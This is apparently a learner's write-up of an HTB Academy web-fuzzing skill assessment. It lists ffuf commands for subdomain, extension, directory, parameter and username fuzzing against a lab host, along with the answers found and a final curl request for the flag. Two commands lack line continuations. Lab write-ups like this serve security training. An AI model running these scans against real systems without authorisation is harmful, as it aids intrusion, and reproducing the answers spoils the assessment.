#  HTB Academy - Academy Skill Assessment Writeup

#* **Overview**

This writeup documents the process of completing the HTB Academy Skill Assessmen. The assessment required identifying subdomains, file extensions, hidden pages, parameters, and finally extracting a flag.


# ** Target Information **

- **IP Address:** `154.57.164.82`
- **Port:** `31857`
- **Domain:** `academy.htb`*


---

## **Reconnaissance & Enumeration**

### **Step 1: Identifying Subdomains * *Question 1**

First, I performed a virtual host fuzzing scan to discover subdomains. The `/etc/hosts` file was updated with the target IP:

```bash
echo "154.57.164.82 academy.htb" | sudo tee -a /etc/hosts
```

**Command used:**

```bash
ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
     -u http://154.57.164.82:31857/ \
     -H 'Host: FUZZ.academy.htb' \
     -fs 985 \
     -t 100
```

**Results:**
- `faculty.academy.htb`
- `archive.academy.htb`
- `test.academy.htb`

**Epdated `/etc/hosts`:**
```bash
154.57.164.82 academy.htb faculty.academy.htb archive.academy.htb test.academy.htb
```

---

### **Step 2: Extension Fuzzing **Question 2**

After identifying subdomains, I fuzzed for accepted file extensions on each subdomain:

**Command:**

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ \
     -u http://faculty.academy.htb:31857/indexFUZZ
```

**Found Extensions:**
- `.phz`
- `.phps`
- `.php7`

---

### **Step 3: Finding the "Access Denied" Page **Question 3**

I performed recursive directory fuzzing with the discovered extensions:

**Command:**

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/common.txt:FUZZ \
     -u http://faculty.academy.htb:31857/FUZZ \
     -e .php,.phps,.php7 \
     -recursion \
     -recursion-depth 2 \
     -fc 404,403 \
     -t 100
```

**Key Findings:**
- `/courses/` directory (301 redirect)
- `/courses/index.php` (Status 200, Size: 0)
- `/courses/index.php7` (Status 200, Size: 0)

The empty responses suggested these files required parameters to display content.

**Discovering the Hidden File:**
During the recursive scan, I found:

```
/courses/linux-security.php7
```

**Full URL:**
```
http://faculty.academy.htb:31857/courses/linux-security.php7
```

---

### **Step 4: Parameter Discovery **Question 4**

I fuzzed for parameters on the discovered page using both GET and POST methods:

**POST Parameters Scan:**

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u http://faculty.academy.htb:31857/courses/linux-security.php7 \
     -X POST 
     -d 'FUZZ=1' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -fc 404 \
     -fs 774 \
     -t 100
```

**Results:**
```
user                    [Status: 200, Size: 780]
username                [Status: 200, Size: 781]
```

**Found Parameters:**
- `user`
- `username`

---

### **Step 5: Finding the Flag **Question 5**

With the parameters identified, I fuzzed for valid values that would return the flag:

**Command:**

```bash
ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt:FUZZ \
     -u http://faculty.academy.htb:31857/courses/linux-security.php7 \
     -X POST 
     -d 'username=FUZZ' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -fc 404 \
     -fs 774 \
     -t 100
```

**Valid Value Found:**
```
username=harry
```

**Retrieving the Flag:**

```bash
curl -X POST http://faculty.academy.htb:31857/courses/linux-security.php7 \
     -d 'username=harry' \
     -H 'Content-Type: application/x-www-form-urlencoded'
```
